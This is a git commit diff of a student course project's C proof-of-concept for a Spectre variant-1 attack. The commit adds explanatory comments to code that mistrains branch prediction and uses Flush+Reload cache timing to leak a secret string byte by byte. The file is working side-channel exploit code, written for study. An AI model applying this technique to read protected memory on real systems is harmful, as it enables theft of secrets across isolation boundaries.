8f6a027d152f1a7190de07c5bcda43635c9d18d2
bradruck <ruckbrad@gmail.com>
2018-04-20 10:55:30 -0600

    Spectre added numerous comments, changed results array from static to dynamic Added FlushReload and CashTime scripts Updated CMakeLists to enable independent execution in CLion

--- Spectre/Spectre.c
+++ Spectre/Spectre.c
@@ -1,5 +1,12 @@
 //
-// Created by Bradley Ruck on 4/18/18.
+// CSCI-5593, Advanced Computer Architecture
+// Spring Semester 2018
+// Bradley Ruck & Justin Shapiro
+// Team #6
+// Security Issues with Branch Prediction
+//
+// Simulated Spectre Attack
+// April 20, 2018
 //
 
 #include <stdio.h>
@@ -16,6 +23,7 @@ char *secret = "Some Secret Value";
 uint8_t array[256*4096];
 
 // Sandbox Function, restricted area for holding the secret
+//
 uint8_t restrictedAccess(size_t x) {
     if (x < buffer_size) {
         return buffer[x];
@@ -25,10 +33,12 @@ uint8_t restrictedAccess(size_t x) {
     }
 }
 
+// Removes all the values from the cache
+//
 void flushSideChannel() {
     int i;
 
-    // Write to array to bring it to RAM to prevent Copy-on-write
+    // Write to array to bring it to RAM to prevent copy-on-write
     for (i = 0; i < 256; i++)
         array[i*4096 + DELTA] = 1;
 
@@ -37,11 +47,14 @@ void flushSideChannel() {
         _mm_clflush(&array[i*4096 +DELTA]);
 }
 
+// Cleans cache, trains the cpu branch predictor, flushes cache again, then reloads cache to find value
+//
 void spectreAttack(size_t larger_x) {
     int i;
     size_t j;
     uint8_t s;
 
+    // Flush the values of the array from cache
     for (i = 0; i < 256; i++) {
         _mm_clflush(&array[i*4096 + DELTA]);
     }
@@ -58,15 +71,18 @@ void spectreAttack(size_t larger_x) {
         _mm_clflush(&array[i*4096 + DELTA]);
     }
 
-    // Ask restrictedAccess() to return the secret in out-of-order execution
+    // Ask restrictedAccess to return the secret in out-of-order execution
     s = restrictedAccess(larger_x);
     array[s*4096 + DELTA] += 88;
 }
 
+// Reloads the cache with the ascii element array, times each element, tabulates the hit rate in a score
+// array to find the secret
+//
 void reloadSideChannel(int scores[]) {
     unsigned int junk = 0;
-    register uint64_t time1, time2;
-    volatile uint8_t *address;
+    register uint64_t time1, time2;     // allows for high precision
+    volatile uint8_t *address;          // this declaration assures address will always be read from memory
     int i;
 
     for (i = 0; i < 256; i++) {
@@ -75,32 +91,34 @@ void reloadSideChannel(int scores[]) {
         junk = *address;
         time2 = __rdtscp(&junk) - time1;
 
-        if (time2 <= CACHE_HIT_THRESHOLD && i != 0) // removes 'no hits' from results, if not, they would always be max
-            scores[i]++; // if cache hit, add 1 for this ascii value
+        if (time2 <= CACHE_HIT_THRESHOLD && i != 0) // removes 'no hits' from results (if not, they would
+            scores[i]++;                            // always be max hits) add 1 for this ascii value
     }
 }
 
 int main() {
     size_t larger_x = (size_t)(secret - (char*)buffer);
-    int i, j, max;
-    int len = (int)strlen(secret); // calculates number of chars in the secret
-    int scores[256];
-    char sourced_secret[len-1]; // create a char array of the secret that we have sourced via the attack
-                                // the -1 eliminates the \0 terminator found at the end of char arrays in c
-    j = 0;
-    // Initialize ascii scores array to keeps track of hits
+    int i, j=0, max;
+    int len = (int)strlen(secret);                          // calculates number of chars in the secret
+    int scores[256];                                        // array to hold ascii value hit totals
+    char *sourced_secret = malloc(len * sizeof(uint8_t));   // create a dynamic char array of the secret
+                                                            // that we have sourced via the attack
+
+    // Iterates over the entire length of the secret
     while (--len >= 0) {
+        // Initialize ascii scores array to keeps track of hits
         for(i = 0; i < 256; i++)
             scores[i]=0;
 
         flushSideChannel();
 
-        // This runs the attack multiple times to improve the likely-hood of a hit, keep track of hits for each ascii
-        // value from 0 to 255, the maximum number of hits will give us the secret byte
+        // This runs the attack multiple times to improve the likely-hood of a hit, keep track of hits
+        // for each ascii value from 0 to 255, the maximum number of hits will give us the secret byte
         for (i = 0; i < 2000; i++) {
             spectreAttack(larger_x);
             reloadSideChannel(scores);
         }
+
         // Find the ascii value that had the most hits
         max = 0;
         for (i = 0; i < 256; i++) {
@@ -108,14 +126,18 @@ int main() {
                 max = i;
         }
 
+        // Print out each of the secret location, hits and corresponding char values for each iteration
         printf("\nReading secret value at %p = ", (void*)larger_x);
         printf("The  secret value is %c\n", max);
         printf("The number of hits is %d\n", scores[max]);
-        char c = (char) max; // convert the ascii value to its corresponding char
-        sourced_secret[j] = c; // add char to the results array
-        larger_x++; // increment to the next memory location of secret
-        j++;
+
+        // Store the secret value as an array for later output
+        char c = (char) max;    // convert the ascii value to its corresponding char
+        sourced_secret[j] = c;  // add char to the results array
+        larger_x++;             // increment to the next memory location of secret
+        j++;                    // increment to the next element in sourced_secret array
     }
+
     printf("\nThe secret is => %s\n", sourced_secret);
     return (0);
 }
